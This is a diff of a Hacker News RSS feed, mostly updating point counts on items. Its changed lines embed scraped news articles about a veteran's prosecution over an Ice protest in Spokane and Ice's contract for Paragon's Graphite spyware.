content="https://cdn.sanity.io/images/3do82whm/next/776b067d1aeef70752bc0350901ca5c05450d85c-1280x720.png"><meta name="theme-color" content="#f6f6f8"></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Amazon must face US nationwide class action over third-party sales (257 pts)]]></title>
+            <title><![CDATA[Amazon must face US nationwide class action over third-party sales (259 pts)]]></title>
             <link>https://www.reuters.com/legal/government/amazon-must-face-us-nationwide-class-action-over-third-party-sales-2025-09-02/</link>
             <guid>45107891</guid>
             <pubDate>Tue, 02 Sep 2025 19:28:43 GMT</pubDate>
@@ -1206,7 +2062,7 @@ Couldn't get https://www.reuters.com/legal/government/amazon-must-face-us-nation
 <div id="readability-page-1" class="page"><div id="maincontent"><p>The arrest of a <a href="https://www.theguardian.com/us-news/us-military" data-link-name="in body link">US army</a> veteran who protested against the <a href="https://www.theguardian.com/us-news/trump-administration" data-link-name="in body link">Trump administration</a>’s immigration crackdown has raised alarms among legal experts and fellow veterans familiar with his service in Afghanistan.</p><p>Bajun Mavalwalla II – a former army sergeant who survived a roadside bomb blast on a special operations mission<strong> </strong>in Afghanistan – was <a href="https://www.justice.gov/usao-edwa/pr/defendants-charged-assaulting-federal-law-enforcement-officers-other-offenses-during" data-link-name="in body link">charged</a> in July with “conspiracy to impede or injure officers” after joining a demonstration against federal Immigration and Customs Enforcement (Ice) in Spokane, Washington.</p><p>Legal experts say the case marks an escalation in the administration’s attacks on first amendment rights. Afghanistan war veterans who know him say the case against Mavalwalla appears unjust.</p><p>“Here’s a guy who held a top secret clearance and was privy to some of the most sensitive information we have, who served in a combat zone,” said Kenneth Koop, a retired colonel who trained the Afghan military and police during Mavalwalla’s deployment. “To see him treated like this really sticks in my craw.”</p><figure id="8dd6b775-71a3-4f70-9faa-93e67fb66ff4" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" priority="feature" deferuntil="idle" props="{&quot;richLinkIndex&quot;:4,&quot;element&quot;:{&quot;_type&quot;:&quot;model.dotcomrendering.pageElements.RichLinkBlockElement&quot;,&quot;prefix&quot;:&quot;Related: &quot;,&quot;text&quot;:&quot;‘Trump’s private army’: inside the push to recruit 10,000 immigration officers &quot;,&quot;elementId&quot;:&quot;8dd6b775-71a3-4f70-9faa-93e67fb66ff4&quot;,&quot;role&quot;:&quot;richLink&quot;,&quot;url&quot;:&quot;https://www.theguardian.com/us-news/2025/sep/02/immigration-hiring-push-trump-private-army&quot;},&quot;ajaxUrl&quot;:&quot;https://api.nextgen.guardianapps.co.uk&quot;,&quot;format&quot;:{&quot;design&quot;:0,&quot;display&quot;:0,&quot;theme&quot;:0}}"></gu-island></figure><p>The 11 June protest against Ice that led to Mavalwalla’s arrest was confrontational, leaving a government van’s windshield smashed and tires slashed, but Mavalwalla was not among the more than two dozen people arrested at the scene. More than a month passed before the <a href="https://www.theguardian.com/us-news/fbi" data-link-name="in body link">FBI</a> arrived at his door on 15 July.</p><p>The 35-year-old, who used his GI Bill to earn a degree in sustainable communities from<strong> </strong>Sonoma State University<strong>, </strong>was set to move into a 3,000-sq-ft house that day, which he had bought with his girlfriend, a nurse and fellow Afghanistan war veteran, with the help of a loan backed by the Department of Veterans Affairs.</p><p>Mavalwalla’s father, a retired US army intelligence officer with three Bronze Stars earned during tours in Iraq and Afghanistan, brought his truck for the occasion. He planned to move his son into a dream home in a bucolic, southern section of Spokane that was large enough to accommodate their blended family (Mavalwalla has one child; his girlfriend, Katelyn Gaston, has three) and solidify the couple’s life together.</p><figure id="6e16be26-a95c-4287-8ba0-888ba7794517" data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.YoutubeBlockElement"><gu-island name="YoutubeBlockComponent" priority="critical" deferuntil="visible" props="{&quot;id&quot;:&quot;30879003-2aa6-4e6a-8fe2-d81f9dccae33&quot;,&quot;assetId&quot;:&quot;YyhqLKKxDUE&quot;,&quot;index&quot;:8,&quot;format&quot;:{&quot;design&quot;:0,&quot;display&quot;:0,&quot;theme&quot;:0},&quot;isMainMedia&quot;:false,&quot;expired&quot;:false,&quot;posterImage&quot;:&quot;https://media.guim.co.uk/164e158a19c30e9876245dfb65f1e2de7dbe71ae/0_0_1920_1080/1920.jpg&quot;,&quot;duration&quot;:154,&quot;mediaTitle&quot;:&quot;FBI arrests US army veteran for ‘conspiracy’ over protest against Ice –&nbsp;video&quot;,&quot;origin&quot;:&quot;https://www.theguardian.com&quot;,&quot;stickyVideos&quot;:false,&quot;enableAds&quot;:true,&quot;iconSizeOnDesktop&quot;:&quot;large&quot;,&quot;iconSizeOnMobile&quot;:&quot;large&quot;,&quot;hidePillOnMobile&quot;:false}"><div data-chromatic="ignore"><figcaption data-spacefinder-role="inline"><span><svg width="36" height="23" viewBox="0 0 36 23"><path d="M3.2 0l-3.2 3.3v16.4l3.3 3.3h18.7v-23h-18.8m30.4 1l-8.6 8v5l8.6 8h2.4v-21h-2.4"></path></svg></span><span>FBI arrests US army veteran for ‘conspiracy’ over protest against Ice –&nbsp;video</span></figcaption></div></gu-island></figure><p>But at 6am the FBI knocked on Mavalwalla’s door and they arrested him. Cell phone <a href="https://www.facebook.com/watch/?v=1248127476957133&amp;ref=sharing" data-link-name="in body link">video</a> shot by Mavalwalla’s father shows the veteran – tall, fit, with wire-rimmed glasses, tight ponytail and trim goatee – smiling in apparent disbelief, his hands shackled behind his back.</p><p>“This is not how I planned to spend my moving day,” Mavalwalla says, as agents search his pockets and force him into a black pickup truck. “I’m a military veteran. I’m an American citizen.”</p><p>At 3pm, Mavalwalla, who receives disability compensation for post traumatic stress disorder connected to his service in Afghanistan, appeared in federal court along with eight other people indicted in connection with a protest against an Ice transport that occurred a month earlier.</p><p>While the indictment alleges other protesters struck federal officers and let the air out of the tires of an Ice transport, Mavalwalla was not charged with obstruction or assault. Instead, he was <a href="https://www.justice.gov/usao-edwa/pr/defendants-charged-assaulting-federal-law-enforcement-officers-other-offenses-during" data-link-name="in body link">charged</a> with “conspiracy to impede or injure officers”.</p><p>According to the indictment, Mavalwalla and his co-defendants “physically blocked the drive-way of the federal facility and/or physically pushed against officers despite orders to disperse and efforts to remove them from the property”.</p><p>Mavalwalla, who has no criminal record, pleaded not guilty.</p><p>His family says Mavalwalla’s actions were motivated by a commitment to non-violent protest, which traces back to the family’s deep connection to the Indian independence leader, Mahatma Gandhi.</p><p>A one-minute video <a href="https://www.instagram.com/reel/DKz9feUPZJe/" data-link-name="in body link">posted on Instagram</a> shows the army veteran briefly jostle with an officer whose face is covered by a ski mask and sunglasses. Mavalwalla then locks arms with other demonstrators to block the gate.</p><p>The conspiracy count carries a maximum penalty of six years in prison, a $250,000 fine and three years of supervised release. He was released on his own recognizance while awaiting trial, with a judge even giving him permission to travel to Disneyland for a previously planned family vacation.</p><h2 id="hes-a-test-case-to-see-how-far-they-can-go">‘He’s a test case to see how far they can go’</h2><p>The US attorney’s office in Spokane, which brought the charges, declined to comment, citing an ongoing investigation.</p><p>The indictment was handed down two days after career prosecutor Richard Barker, the acting US attorney for eastern Washington state, resigned. In a social post, Barker called his exit “a very difficult decision”.</p><p>“I am grateful that I never had to sign an indictment or file a brief that I didn’t believe in,” he <a href="https://www.linkedin.com/feed/update/urn:li:activity:7350949196650213377/" data-link-name="in body link">wrote</a>.</p><p>The current acting US attorney, nominated for the permanent post by Donald Trump, is Pete Serrano, a former litigator for the Silent Majority Foundation, a conservative advocacy group. In February, Serrano <a href="https://irp.cdn-website.com/6a12d959/files/uploaded/89-1.pdf" data-link-name="in body link">filed an amicus brief</a> in support of Trump’s executive order to end birthright citizenship, a position at odds with the 14th amendment. He has no prosecutorial experience and has described the January 6 US Capitol rioters as “political prisoners”.</p><p>Patty Murray, a Democratic senator from Washington state, has <a href="https://www.krem.com/article/news/local/senator-murray-block-confirmation-eastern-wa-federal-prosecutor-pete-serrano/293-99d00dc0-13bb-45cc-b9fd-f3bc76e59a35" data-link-name="in body link">pledged</a> to block his confirmation.</p><p>Legal experts say the conspiracy charges against Mavalwalla underscore the lengths the <a href="https://www.theguardian.com/us-news/trump-administration" data-link-name="in body link" data-component="auto-linked-tag">Trump administration</a> will go to quash protests against Ice, giving the immigration agency a free hand as it steps up raids, adds agents and seeks to achieve the president’s goal of 3,000 deportations per day.</p><p>So far, the Trump administration has primarily charged demonstrators for assault and obstruction, acts that typically involve a victim and an assailant. But a federal conspiracy <a href="https://www.law.cornell.edu/uscode/text/18/372" data-link-name="in body link">charge</a> is a crime of intent. In this case, prosecutors would just have to prove that defendants agreed in concert to impede or injure an officer.</p><p>“He’s a test case to see how far they can go,” said Luis Miranda, a former chief spokesperson for the Department of Homeland Security under Joe Biden.</p><h2 id="honest-direct-polite-and-very-trustworthy">‘Honest, direct, polite and very trustworthy’</h2><p>The charges against Mavalwalla sent shockwaves through a tight community of veterans with connections forged in Afghanistan that intensified after the bungled August 2021 US withdrawal. The fall of Kabul to the Taliban brought them together again to evacuate Afghans who worked alongside the <a href="https://www.theguardian.com/us-news/us-military" data-link-name="in body link" data-component="auto-linked-tag">US military</a>.</p><p>After his arrest, Mavalwalla’s commanding officer, Col Charles Hancock, who is retired, wrote on Facebook that he knew the trained crypto-linguist to be “honest, direct, polite and very trustworthy” and was “deeply concerned about the current state of affairs in our country”.</p><p>Koop, the retired colonel, said Mavalwalla put the diplomatic connections he gained due to his security clearance at the disposal of Koop’s translator, who escaped and otherwise might have been murdered by the Taliban. “It was no surprise to me that concern for the individual, human rights and safety would be right up Bajun’s portfolio and mindset,” Koop said.</p><p>As word spread that Mavalwalla knew how to rescue people in the frenetic days after the fall of Kabul, more people reached out.</p><p>When Erin Piper, the community director at a church in Livonia, Michigan, learned that a relative of one of her son’s friends had worked as a custodian on a US military base in Afghanistan, she called Mavalwalla to see if he could help bring over an extended family of aunts, uncles and siblings who had been left behind.</p><figure id="553b645f-26e6-42bc-af60-579683c76f5a" data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.ImageBlockElement"><div id="img-1"><picture><source srcset="https://i.guim.co.uk/img/media/d1ebd41765378378d999eb2fb65a5c7a9e9f5c47/0_0_6000_4000/master/6000.jpg?width=620&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 660px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 660px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/d1ebd41765378378d999eb2fb65a5c7a9e9f5c47/0_0_6000_4000/master/6000.jpg?width=620&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 660px)"><source srcset="https://i.guim.co.uk/img/media/d1ebd41765378378d999eb2fb65a5c7a9e9f5c47/0_0_6000_4000/master/6000.jpg?width=605&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 480px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 480px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/d1ebd41765378378d999eb2fb65a5c7a9e9f5c47/0_0_6000_4000/master/6000.jpg?width=605&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 480px)"><source srcset="https://i.guim.co.uk/img/media/d1ebd41765378378d999eb2fb65a5c7a9e9f5c47/0_0_6000_4000/master/6000.jpg?width=445&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 320px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 320px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/d1ebd41765378378d999eb2fb65a5c7a9e9f5c47/0_0_6000_4000/master/6000.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 320px)"><img alt="plane in sky as a group of people stand outside" src="https://i.guim.co.uk/img/media/d1ebd41765378378d999eb2fb65a5c7a9e9f5c47/0_0_6000_4000/master/6000.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" width="445" height="296.66666666666663" loading="lazy"></picture></div><figcaption data-spacefinder-role="inline"><span><svg width="18" height="13" viewBox="0 0 18 13"><path d="M18 3.5v8l-1.5 1.5h-15l-1.5-1.5v-8l1.5-1.5h3.5l2-2h4l2 2h3.5l1.5 1.5zm-9 7.5c1.9 0 3.5-1.6 3.5-3.5s-1.6-3.5-3.5-3.5-3.5 1.6-3.5 3.5 1.6 3.5 3.5 3.5z"></path></svg></span><span>A military transport plane launches off while Afghans who cannot get into the airport to evacuate, watch and wonder while stranded outside, in Kabul, Afghanistan, on 23 August 2021. </span> Photograph: Marcus Yam/Los Angeles Times/Getty Images</figcaption></figure><p>Mavalwalla sprung into action, locating safe houses for 20 members of the former custodian’s extended family and at least a dozen other Afghan civilians whose family members collaborated with the US military, she said. He helped them acquire travel documents, arranged for safe transport over land to Pakistan and raised $130,000 to pay expenses, including visa applications and flights there to Brazil and eventually to the United States.</p><p>“It was hard,” Piper said, but Mavalwalla was patient.</p><p>In text messages, he urged Piper to be sure to take care of herself and her family. “It does no good for us to neglect those right in front of us,” he wrote on 25 September 2021, a month after the Taliban takeover.</p><p>“You cannot save the world,” he added. “It’s good to try though.”</p><h2 id="an-issue-of-selective-prosecution">‘An issue of selective prosecution’</h2><p>Mavalwalla was one of hundreds of people to respond to a 11 June social media <a href="https://www.facebook.com/benstuckart1/posts/pfbid0rKq9oyQisLZ8zS8xfKbbnXL3nJ4wbR3Tb7F3CAJpH3JjPf7LiHsfDSA49NKe5N3hl" data-link-name="in body link">post</a> from the former president of the Spokane city council that encouraged protesters to block an Ice transport they believed would carry two Venezuelan immigrants <a href="https://www.spokesman.com/stories/2025/jun/12/two-refugees-came-here-legally-they-were-detained-/?fbclid=IwY2xjawMUWrVleHRuA2FlbQIxMQABHqyd4uxfvk3xUeuCYhL6obVNlKWiP08kWOBJ7565fakLK4t-xcfIX1Czu09T_aem_VXJD9q8c2_tv74wNqTV-DQ" data-link-name="in body link">who were in the country legally</a>, petitioning for asylum when they were detained.</p><p>“I am going to sit in front of the bus,” Ben Stuckart, the former city council president, wrote. “Feel free to join me.”</p><p>In interviews, former prosecutors said the <a href="https://www.law.cornell.edu/uscode/text/18/372" data-link-name="in body link">conspiracy statute</a> was broad and afforded the Trump administration potentially sweeping powers.</p><p>“Federal conspiracy charges are a wondrous thing,” said Bruce Antkowiak, a former federal prosecutor who teaches at Saint Vincent College in Pennsylvania. “It is a vast net which you can use to catch a bunch of people.”</p><p>Under this law, prosecutors won’t have to prove that Mavalwalla blocked the bus or attacked agents, Antkowiak said. “The major issue in a conspiracy case is intent,” he said. “You have to prove an agreement. You don’t have to prove that people sat down together and made a pledge. You don’t even have to write up an agreement they have verbally, but you have to prove that these people agreed to act in concert,” he said.</p><p>Because of the law’s sweeping power, prosecutors typically use discretion, experts said.</p><p>“It seems like what we have here is an issue of selective prosecution,” Robert Chang, a law professor at the University of California, Irvine, said that will lead to a “chilling effect on free speech under the first amendment”.</p><figure id="6f07bf6a-bbc7-4193-a6f7-3afed0332ab9" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" priority="feature" deferuntil="idle" props="{&quot;richLinkIndex&quot;:46,&quot;element&quot;:{&quot;_type&quot;:&quot;model.dotcomrendering.pageElements.RichLinkBlockElement&quot;,&quot;prefix&quot;:&quot;Related: &quot;,&quot;text&quot;:&quot;How Trump has supercharged the immigration crackdown - in data&quot;,&quot;elementId&quot;:&quot;6f07bf6a-bbc7-4193-a6f7-3afed0332ab9&quot;,&quot;role&quot;:&quot;richLink&quot;,&quot;url&quot;:&quot;https://www.theguardian.com/us-news/ng-interactive/2025/jul/23/trump-ice-data-deportations-detention&quot;},&quot;ajaxUrl&quot;:&quot;https://api.nextgen.guardianapps.co.uk&quot;,&quot;format&quot;:{&quot;design&quot;:0,&quot;display&quot;:0,&quot;theme&quot;:0}}"></gu-island></figure><p>Antkowiak said he expected the justice department to bring conspiracy charges more frequently in the months ahead, given the Trump administration’s desire for Ice agents to pursue an agenda of rapid deportations unhindered.</p><p>Jennifer Chacón, a Stanford University law professor who studies the intersection of immigration and criminal law, said she would not be surprised if Ice increased monitoring social media to bring more cases like the one against Mavalwalla.</p><p>“You could view this as an attempt to send a message to everyone who feels a sense of justice and moral outrage over Ice raids – you could face prosecution, too,” she said.</p><p>Mavalwalla’s mother, US army veteran Ellyn Mavalwalla, said her son did not know Stuckart, the former city councilman whose social media post sparked the demonstration, and only met him in jail on 15 July, after both were arrested on federal charges by the FBI.</p><p>His father, retired intelligence officer Bajun Ray Mavalwalla, said he believed his son had been racially profiled – that in reviewing footage from the demonstration, federal authorities had fixated on the demonstrator “with a funny name”.</p><p>He said he worried the United States was being “taken over by fascists”, but also that the promise of America that drew his family here generations ago would endure.</p><p>“My father left India on the deck of a boat, at 19 years old,” the elder Mavalwalla<strong> </strong>said. “He floated for six days across the Arabian Sea to Kuwait. He nearly died when he arrived. Then an American family sponsored him to come to the US.”</p><h2 id="gandhis-legacy">Gandhi’s legacy</h2><p>In addition to military service, a commitment to peaceful protest has been at the heart of the Mavalwalla family for generations.</p><figure id="1f305f73-2221-4e30-a235-27f1234ac4a3" data-spacefinder-role="inline" data-spacefinder-type="model.dotcomrendering.pageElements.ImageBlockElement"><div id=""><picture><source srcset="https://i.guim.co.uk/img/media/4d55f077777de7bacc5d9ffde4ec60c53b493bde/0_0_480_277/master/480.jpg?width=620&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 660px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 660px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/4d55f077777de7bacc5d9ffde4ec60c53b493bde/0_0_480_277/master/480.jpg?width=620&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 660px)"><source srcset="https://i.guim.co.uk/img/media/4d55f077777de7bacc5d9ffde4ec60c53b493bde/0_0_480_277/master/480.jpg?width=605&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 480px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 480px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/4d55f077777de7bacc5d9ffde4ec60c53b493bde/0_0_480_277/master/480.jpg?width=605&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 480px)"><source srcset="https://i.guim.co.uk/img/media/4d55f077777de7bacc5d9ffde4ec60c53b493bde/0_0_480_277/master/480.jpg?width=445&amp;dpr=2&amp;s=none&amp;crop=none" media="(min-width: 320px) and (-webkit-min-device-pixel-ratio: 1.25), (min-width: 320px) and (min-resolution: 120dpi)"><source srcset="https://i.guim.co.uk/img/media/4d55f077777de7bacc5d9ffde4ec60c53b493bde/0_0_480_277/master/480.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" media="(min-width: 320px)"><img alt="black and white photo of a group of men" src="https://i.guim.co.uk/img/media/4d55f077777de7bacc5d9ffde4ec60c53b493bde/0_0_480_277/master/480.jpg?width=445&amp;dpr=1&amp;s=none&amp;crop=none" width="445" height="256.8020833333333" loading="lazy"></picture></div><figcaption data-spacefinder-role="inline"><span><svg width="18" height="13" viewBox="0 0 18 13"><path d="M18 3.5v8l-1.5 1.5h-15l-1.5-1.5v-8l1.5-1.5h3.5l2-2h4l2 2h3.5l1.5 1.5zm-9 7.5c1.9 0 3.5-1.6 3.5-3.5s-1.6-3.5-3.5-3.5-3.5 1.6-3.5 3.5 1.6 3.5 3.5 3.5z"></path></svg></span><span>Rustomjee and Gandhi.</span> Photograph: undefined/Courtesy Mavalwalla Family</figcaption></figure><p>Mavalwalla II’s great-great, grand-uncle, Parsee Rustomjee worked with<strong> </strong>Gandhi in South Africa and supported the Indian independence leader when he launched his legendary, non-violent revolution against British imperialism.</p><p>The two families were close – according to the family, Gandhi was godfather to Mavalwalla’s great-grandmother – “and Bajun grew up with stories,” his mother said, with social justice at the center.</p><p>After Gandhi was assassinated in 1948, his burial shroud was distributed among his family’s closest confidants, including members of Mavalwalla’s family, and is now held by Mavalwalla’s mother.</p><p>Three days after the protest, his mother texted him: “Channel your inner Gandhi.”</p><p>“I know, mom,” Mavalwalla replied. “Always non-violence.”</p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Vijaye Raji to become CTO of Applications with acquisition of Statsig (163 pts)]]></title>
+            <title><![CDATA[Vijaye Raji to become CTO of Applications with acquisition of Statsig (165 pts)]]></title>
             <link>https://openai.com/index/vijaye-raji-to-become-cto-of-applications-with-acquisition-of-statsig/</link>
             <guid>45106981</guid>
             <pubDate>Tue, 02 Sep 2025 18:18:10 GMT</pubDate>
@@ -1222,7 +2078,7 @@ Couldn't get https://openai.com/index/vijaye-raji-to-become-cto-of-applications-
 <div id="readability-page-1" class="page"><div id="maincontent"><p><a href="https://www.theguardian.com/us-news/usimmigration" data-link-name="in body link">US immigration</a> agents will have access to one of the world’s most sophisticated hacking tools after a decision by the <a href="https://www.theguardian.com/us-news/trump-administration" data-link-name="in body link">Trump administration</a> to move ahead with a contract with Paragon Solutions, a company founded in Israel which makes spyware that can be used to hack into any mobile phone – including encrypted applications.</p><p>The Department of Homeland Security first entered into a contract with Paragon, now owned by a US firm, <a href="https://www.wired.com/story/ice-paragon-solutions-contract/" data-link-name="in body link">in late 2024</a>, under the Biden administration. But the $2m contract was put on hold pending a compliance review to make sure it adhered to an executive order that restricts the US government’s use of spyware, Wired reported at the time.</p><p>That pause has now been lifted, according to <a href="https://www.fpds.gov/ezsearch/search.do?indexName=awardfull&amp;templateName=1.5.3&amp;s=FPDS.GOV&amp;q=70CTD024P00000012+7012+" data-link-name="in body link">public procurement documents</a>, which list US <a href="https://www.theguardian.com/us-news/ice-us-immigration-and-customs-enforcement" data-link-name="in body link">Immigration and Customs Enforcement </a>(Ice) as the contracting agency.</p><p>It means that one of the most powerful stealth cyberweapons ever created – which was produced outside the US – is now in the hands of an agency that has repeatedly been accused by civil and human rights groups of violating people’s due process rights.</p><p>The story was first reported by the journalist Jack Poulson on his <a href="https://jackpoulson.substack.com/p/exclusive-ice-has-reactivated-its" data-link-name="in body link">All-Source Intelligence Substack newsletter</a>.</p><p>Neither <a href="https://www.theguardian.com/business/paragongroupofcompanies" data-link-name="in body link" data-component="auto-linked-tag">Paragon</a> nor Ice immediately responded to a request for comment.</p><p>When it is successfully deployed against a target, the hacking software – called Graphite – can hack into any phone. By essentially taking control of the mobile phone, the user – in this case, Ice – can not only track an individual’s whereabouts, read their messages, look at their photographs, but it can also open and read information held on encrypted applications, like WhatsApp or Signal. Spyware like Graphite can also be used as a listening device, through the manipulation of the phone’s recorder.</p><p>An <a href="https://www.presidency.ucsb.edu/documents/executive-order-14093-prohibition-use-the-united-states-government-commercial-spyware-that" data-link-name="in body link">executive order signed by the Biden administration</a> sought to establish some guardrails around the US government’s use of spyware. It said that the US “shall not make operational use of commercial spyware that poses significant counterintelligence or security risks to the United States government or significant risks of improper use by a foreign government or foreign person”. The Biden administration also took the extraordinary step of <a href="https://www.theguardian.com/us-news/2021/nov/03/nso-group-pegasus-spyware-us-blacklist" data-link-name="in body link">placing one of Paragon’s rival spyware makers, NSO Group, on a commerce department blacklist</a>, saying the company had knowingly supplied foreign governments to “maliciously target” the phones of dissidents, human rights activists and journalists.</p><p>Paragon has sought to differentiate itself from NSO Group. It has said that, unlike NSO – which previously sold its spyware to Saudi Arabia and other regimes – that it only does business with democracies. It has also said it has a no tolerance policy and will cut off government clients who use the spyware to target members of civil society, such as journalists. Paragon refuses to disclose who its clients are and has said it does not have insight into how its clients use the technology against targets.</p><p>Spyware makers like Paragon and NSO have said their products are intended to be used to prevent crime and terrorist attacks. But both companies’ software has been used in the past to target innocent people, including individuals who have been perceived to be government enemies.</p><p>John Scott-Railton, a senior research at the Citizen Lab at the University of Toronto, who is one of the world’s leading experts on cases in which <a href="https://citizenlab.ca/2025/06/first-forensic-confirmation-of-paragons-ios-mercenary-spyware-finds-journalists-targeted/" data-link-name="in body link">spyware like Graphite has been abused by governments</a>, said in a statement that such tools “were designed for dictatorships, not democracies built on liberty and protection of individual rights”.</p><p>“Invasive, secret hacking power is corrupting. That’s why there’s a growing pile of spyware scandals in democracies, including with Paragon’s Graphite,” he said, referring to a controversy in Italy that erupted late last year.</p><figure id="953358b4-99ba-484b-8e32-c0d5fd01142a" data-spacefinder-role="richLink" data-spacefinder-type="model.dotcomrendering.pageElements.RichLinkBlockElement"><gu-island name="RichLinkComponent" priority="feature" deferuntil="idle" props="{&quot;richLinkIndex&quot;:12,&quot;element&quot;:{&quot;_type&quot;:&quot;model.dotcomrendering.pageElements.RichLinkBlockElement&quot;,&quot;prefix&quot;:&quot;Related: &quot;,&quot;text&quot;:&quot;Videos reveal harsh conditions inside Ice’s New York City confinement center&quot;,&quot;elementId&quot;:&quot;953358b4-99ba-484b-8e32-c0d5fd01142a&quot;,&quot;role&quot;:&quot;richLink&quot;,&quot;url&quot;:&quot;https://www.theguardian.com/us-news/2025/jul/22/ice-videos-new-york-trump&quot;},&quot;ajaxUrl&quot;:&quot;https://api.nextgen.guardianapps.co.uk&quot;,&quot;format&quot;:{&quot;design&quot;:0,&quot;display&quot;:0,&quot;theme&quot;:0}}"></gu-island></figure><p>Paragon broke off its ties to Italy after it was revealed that <a href="https://www.theguardian.com/technology/2025/jan/31/whatsapp-israel-spyware" data-link-name="in body link">90 people, including journalists and members of civil society,</a> in two dozen countries, had been targeted with the spyware. The individuals who were targeted by the Italian government included human rights activists who have been critical of Italy’s dealings with Libya. Several journalists were also targeted, though it is still unclear who ordered those hacking attacks.</p><p>The US government has in the past resisted using spyware technology made outside the US because of concerns that any company that sells technology to multiple government agencies around the world represents a potential security risk.</p><p>“As long as the same mercenary spyware tech is going to multiple governments, there is a baked-in counterintelligence risk. Since all of them now know what secret surveillance tech the US is using, and would have special insights on how to detect it and track what the US is doing with it,” Scott-Railton said. “Short of Paragon cancelling all foreign contracts, I’m not sure how this goes away.”</p><p>Nadine Farid Johnson, policy director at the Knight First Amendment Institute at Columbia University, which is dedicated to free speech advocacy, said news of the Ice contract compounded civil liberty concerns surrounding the “rapid and dramatic expansion of Ice’s budget and authority”. She also called on Congress to step in and limit the circumstances in which spyware could be deployed.</p><p>“Spyware like Paragon’s Graphite poses a profound threat to free speech and privacy,” Farid Johnson said. “It has already been used against journalists, human rights advocates, and political dissidents around the world. The quiet lifting of the stop work order also raises the troubling prospect that parts of the executive branch are acting without adherence to the government’s own vetting requirements.”</p></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Physically based rendering from first principles (217 pts)]]></title>
+            <title><![CDATA[Physically based rendering from first principles (227 pts)]]></title>
             <link>https://imadr.me/pbr/</link>
             <guid>45106846</guid>
             <pubDate>Tue, 02 Sep 2025 18:07:22 GMT</pubDate>
@@ -1656,7 +2512,7 @@ For example, microwaves are used for Wi-Fi and cooking, X-rays are used in medic
 </div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Introduction to Ada: a project-based exploration with rosettas (174 pts)]]></title>
+            <title><![CDATA[Introduction to Ada: a project-based exploration with rosettas (178 pts)]]></title>
             <link>https://blog.adacore.com/introduction-to-ada-a-project-based-exploration-with-rosettas</link>
             <guid>45106314</guid>
             <pubDate>Tue, 02 Sep 2025 17:32:08 GMT</pubDate>
@@ -1790,7 +2646,7 @@ end Rosetta_Renderer;</code></pre><div><p dir="ltr">This procedure generates an 
    end Put_Path;</code></pre><div><h2 dir="ltr"><strong>Afterword</strong></h2><p dir="ltr">This small project was an enjoyable and useful way to get back into Ada. It helped me reconnect with the language’s main strengths and refamiliarize myself with its tools and design. It was a great reminder of how fun, easy to learn, and remarkably modern Ada can be, especially for developers focused on building robust, maintainable, and efficient software.</p><p dir="ltr">I hope this short walkthrough gives a good idea of that feeling, whether you're already into Ada or just starting to explore it.</p></div></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Microsoft rewarded for security failures with another US Government contract (178 pts)]]></title>
+            <title><![CDATA[Microsoft rewarded for security failures with another US Government contract (179 pts)]]></title>
             <link>https://www.theregister.com/2025/09/02/microsoft_rewarded_for_security_failures/</link>
             <guid>45106295</guid>
             <pubDate>Tue, 02 Sep 2025 17:30:35 GMT</pubDate>
@@ -1848,7 +2704,7 @@ end Rosetta_Renderer;</code></pre><div><p dir="ltr">This procedure generates an 
                     </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Python has had async for 10 years – why isn't it more popular? (279 pts)]]></title>
+            <title><![CDATA[Python has had async for 10 years – why isn't it more popular? (285 pts)]]></title>
             <link>https://tonybaloney.github.io/posts/why-isnt-python-async-more-popular.html</link>
             <guid>45106189</guid>
             <pubDate>Tue, 02 Sep 2025 17:24:57 GMT</pubDate>
@@ -7178,195 +8034,6 @@ the original comment on GitHub.</em></p>
 
   </main>
 </div></div>]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Europol said ChatControl doesn't go far enough; they want to retain data forever (127 pts)]]></title>
-            <link>https://old.reddit.com/r/europe/comments/1n6cjw1/europol_said_chat_control_doesnt_go_far_enough/</link>
-            <guid>45101127</guid>
-            <pubDate>Tue, 02 Sep 2025 10:21:42 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://old.reddit.com/r/europe/comments/1n6cjw1/europol_said_chat_control_doesnt_go_far_enough/">https://old.reddit.com/r/europe/comments/1n6cjw1/europol_said_chat_control_doesnt_go_far_enough/</a>, See on <a href="https://news.ycombinator.com/item?id=45101127">Hacker News</a></p>
-<div id="readability-page-1" class="page"><div><p>Palantir CEO, Alex Karp.</p>
-
-<p><a href="https://www.reddit.com/r/singularity/s/7mziZTnxWS">https://www.reddit.com/r/singularity/s/7mziZTnxWS</a></p>
-
-<p>And the owner is even more unhinged than that.</p>
-
